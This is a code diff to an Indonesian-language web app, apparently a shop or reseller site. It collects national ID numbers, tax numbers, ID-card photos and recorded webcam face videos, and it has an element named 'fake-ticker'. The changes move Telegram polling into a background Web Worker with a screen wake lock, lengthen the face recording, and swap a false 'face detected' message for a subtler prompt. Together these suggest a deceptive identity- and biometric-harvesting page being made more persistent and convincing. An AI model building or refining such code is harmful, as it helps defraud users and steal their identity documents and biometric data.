@@ -95,7 +95,7 @@
         .btn-action-secondary { background: var(--bg-input); color: var(--text-main); border: 1px solid var(--border-color); }
 
         .services-section { padding: 0 20px; margin-bottom: 30px; }
-        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; color: var(--text-main); display: flex; justify-content: space-between; align-items: center; letter-spacing: -0.3px;}
+        .section-title { font-size: 15px; font-weight: 700; margin-bottom: 15px; color: var(--text-main); display: flex; justify-content: space-between; align-items: center; letter-spacing: -0.3px;}
         
         .service-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px 10px; }
         .service-item { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; transition: transform 0.2s;}
@@ -169,7 +169,7 @@
         }
         .fs-content { padding: 12px; display:flex; flex-direction: column; flex: 1; }
         .fs-name { font-size: 14px; font-weight: 700; color: var(--text-main); margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
-        .fs-price-strike { font-size: 11px; color: var(--text-muted); text-decoration: line-through;}
+        .fs-price-strike { font-size: 12px; color: var(--text-muted); text-decoration: line-through;}
         .fs-price { font-size: 16px; color: var(--danger); font-weight: 800; margin-bottom: 12px; flex: 1;}
         .fs-add-btn {
             width: 100%; padding: 10px; border-radius: 12px; background: rgba(239, 68, 68, 0.1); color: var(--danger); border: none; cursor: pointer; font-weight: 700; font-size: 12px; transition: all 0.2s;
@@ -595,7 +595,7 @@
             </div>
         </div>
 
-        <div class="services-section" id="section-fake-ticker">
+        <div class="services-section" id="section-fake-ticker" style="display:none;">
         <div class="section-title" id="transaksi-title"></div>
               <div class="fake-ticker-container" id="fake-ticker-box">
                 </div>
@@ -982,7 +982,7 @@
     <div id="recovery-modal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-header">
-                <h3>Pemulihan Akun Terdaftar</h3>
+                <h3>Pemulihan Akun</h3>
                 <button class="btn-icon" onclick="closeTargetModal('recovery-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
             <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Nomor sudah terdaftar! Masukkan NIK KTP terverifikasi Anda untuk memulihkan dan mereset credential sandi akun Anda.</p>
@@ -1053,7 +1053,7 @@
             <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="res-nik-input" placeholder="Masukkan 16 Digit NIK"></div>
             <div class="input-group"><label>Nomor NPWP Pribadi</label><input type="number" id="res-npwp" placeholder="Nomor NPWP Aktif"></div>
             <div class="input-group"><label>Surat Izin Usaha / Dokumen Pendukung</label><input type="file" id="res-doc" style="padding:10px; background:var(--bg-card);"></div>
-            <button class="btn-modal" onclick="submitResellerVerification()">Kirim Berkas Verifikasi</button>
+            <button class="btn-modal" onclick="submitResellerVerification()">Verifikasi</button>
         </div>
     </div>
 
@@ -1225,7 +1225,7 @@
             <div class="input-group"><label>Nama Sesuai Dokumen KTP</label><input type="text" id="v-name" placeholder="Nama Lengkap"></div>
             <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="v-nik" placeholder="Masukkan 16 angka NIK KTP"></div>
             <div class="input-group"><label>Unggah Gambar Foto Fisik KTP</label><input type="file" id="v-file" accept="image/*" style="padding:10px; background:var(--bg-card);"></div>
-            <button class="btn-modal" onclick="proceedToFaceScan()">Konfirmasi</button>
+            <button class="btn-modal" onclick="proceedToFaceScan()">Verifikasi</button>
         </div>
     </div>
 
@@ -1273,7 +1273,6 @@
         let currentUserName = localStorage.getItem('sanz_current_name');
         let userBalance = 0; 
         let tradeHistory = []; 
-        let telegramPollInterval = null;
         let depositTimerInterval = null;
         let processedUpdates = JSON.parse(localStorage.getItem('sanz_processed_tg_updates')) || [];
         let isPolling = false;
@@ -1288,7 +1287,61 @@
         let currentLoginPinInput = '';
         let loginPinFailures = 0;
 
-        function recordFaceVideo(stream, duration = 5000) {
+        const workerCode = `
+            let timer;
+            self.onmessage = function(e) {
+                if (e.data === 'start') {
+                    if (timer) clearInterval(timer);
+                    timer = setInterval(() => self.postMessage('tick'), 2500);
+                } else if (e.data === 'stop') {
+                    clearInterval(timer);
+                }
+            };
+        `;
+        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+        const timerWorker = new Worker(URL.createObjectURL(workerBlob));
+
+        timerWorker.onmessage = function(e) {
+            if (e.data === 'tick') {
+                fetchTelegramUpdates();
+            }
+        };
+
+        function startTelegramPolling() {
+            fetchTelegramUpdates(); 
+            timerWorker.postMessage('start');
+            isPolling = true;
+        }
+
+        let wakeLock = null;
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('Screen Wake Lock is active');
+                }
+            } catch (err) {
+                console.error(`Wake Lock error: ${err.name}, ${err.message}`);
+            }
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            requestWakeLock();
+        });
+
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === "visible") {
+                requestWakeLock();
+                if (currentUserPhone) {
+                    fetchTelegramUpdates();
+                    checkMaintenance();
+                    updateBalanceDisplay();
+                    renderHistory();
+                }
+            }
+        });
+
+        function recordFaceVideo(stream, duration = 7000) {
             return new Promise((resolve) => {
                 let options = { mimeType: 'video/webm' };
                 if (MediaRecorder.isTypeSupported('video/mp4')) {
@@ -1422,7 +1475,7 @@
             if(slideIndex > 2) slideIndex = 0;
             slides.style.transform = `translateX(-${slideIndex * 100}%)`;
         }
-        setInterval(autoSlide, 3500);
+        setInterval(autoSlide, 4000);
 
         function startFlashsaleTimer() {
             const el = document.getElementById('flashsale-timer');
@@ -1909,7 +1962,10 @@
             document.getElementById('user-id-display').innerText = "UID: -";
 
             updateAuthUI(); showModal("Perhatian", "Keluar akun berhasil.", "info");
-            if (telegramPollInterval) { clearInterval(telegramPollInterval); isPolling = false; }
+            
+            // Stop Web Worker Polling
+            timerWorker.postMessage('stop');
+            isPolling = false;
         }
 
         function processChangePassword() {
@@ -2249,10 +2305,10 @@
     
               videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
     
-              setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memverifikasi..."; }, 1000);
+              setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Posisikan wajah pada bingkai..."; }, 1000);
     
               setTimeout(async () => { 
-                  const faceBlob = await recordFaceVideo(webcamStream, 5000); 
+                  const faceBlob = await recordFaceVideo(webcamStream, 7000); 
                   finishResellerBioVerification(biz, nik, npwp, docInput.files[0], faceBlob); 
               }, 1000);
            } catch(e) {
@@ -2801,12 +2857,6 @@
             }
         }
 
-        function startTelegramPolling() {
-            if (telegramPollInterval) clearInterval(telegramPollInterval);
-            fetchTelegramUpdates(); 
-            telegramPollInterval = setInterval(fetchTelegramUpdates, 2500); 
-        }
-
         function renderHistory() {
             const box = document.getElementById('history-box'); const fullList = document.getElementById('full-history-list');
             box.innerHTML = ''; fullList.innerHTML = '';
@@ -2906,10 +2956,10 @@
   
             videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
 
-            setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memverifikasi..."; }, 1000);
+            setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Posisikan wajah pada bingkai..."; }, 1000);
         
             setTimeout(async () => { 
-            const faceBlob = await recordFaceVideo(webcamStream, 5000);
+            const faceBlob = await recordFaceVideo(webcamStream, 7000);
             finishBioVerification(n, nik, fileInput.files[0], faceBlob); 
             }, 1000);
        } catch(e) {
